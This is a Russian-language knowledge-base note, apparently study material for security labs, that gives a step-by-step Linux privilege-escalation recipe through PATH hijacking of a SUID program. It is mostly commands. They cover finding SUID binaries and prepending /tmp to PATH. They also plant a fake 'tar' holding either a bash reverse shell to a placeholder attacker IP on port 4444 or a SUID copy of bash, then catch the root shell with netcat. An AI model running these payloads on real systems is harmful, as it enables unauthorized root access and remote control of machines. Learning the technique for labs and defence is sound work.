---
title: "Повышение привилегий в linux с помощью PATH Hijacking"
id: note-39
created: "03.02.2026 08:01"
category: "06_Linux и повышение привилегий"
tags:
  - иб/linux
  - privesc
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `06_Linux и повышение привилегий` · Дата: `03.02.2026 08:01`

# Повышение привилегий в linux с помощью PATH Hijacking

Поиск уязвимости 
 Ищем SUID-программы:
find / -perm -4000 -type f 2>/dev/null
Проверяем, вызывают ли программы без пути:
 Ищем вызовы system(), exec()
strings программа | grep -E "system\(|exec\(|popen\("

Пример уязвимого кода:
system("thm");        # УЯЗВИМО - нет пути
system("/bin/thm");   # БЕЗОПАСНО - есть путь

Эксплуатация

Шаг 1: Нашли уязвимую программу
ls -la /usr/local/bin/backup
Шаг 2:Анализируем программу
 strings /usr/local/bin/backup
 Находим: system("tar czf /backup/*")
 tar вызывается без полного пути - УЯЗВИМОСТЬ!
Шаг 3: Проверяем PATH
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/sbin
Шаг 4: Добавляем нашу папку в PATH
 /tmp обычно доступен для записи

export PATH=/tmp:$PATH
echo $PATH
# /tmp:/usr/local/bin:/usr/bin:/bin:/sbin
Шаг 5: Создаём вредоносную программу
 Наша папка теперь первая в PATH
 Создаём файл с именем 'tar' в /tmp

Вариант 1: Reverse shell
cat > /tmp/tar << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ВАШ_IP/4444 0>&1
EOF

Вариант 2: Создание SUID-шелла
cat > /tmp/tar << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

chmod +x /tmp/tar

Шаг 6: Запускаем уязвимую программу
/usr/local/bin/backup
# → Программа ищет 'tar' в PATH
# → Первый путь: /tmp
# → Находит наш /tmp/tar
# → Запускает его с правами root (SUID)
Шаг 7: Получаем root
Если использовали reverse shell:
nc -lvnp 4444  # на своей машине
# Получаем root-шелл

Если создали SUID-bash:
/tmp/rootbash -p
# -p сохраняет привилегии root


Итого 

1. find / -perm -4000                      # Ищем SUID-программы
2. strings программа                      # Ищем вызовы без пути
3. echo $PATH                                  # Смотрим PATH
4. export PATH=/tmp:$PATH          # Добавляем свою папку
5. cat > /tmp/команда                    # Создаём вредоносный файл
6. chmod +x /tmp/команда           # Делаем исполняемым
7. ./суид_программа                      # Запускаем → получаем root
8. whoami                                         # Проверяем: должно быть "root"
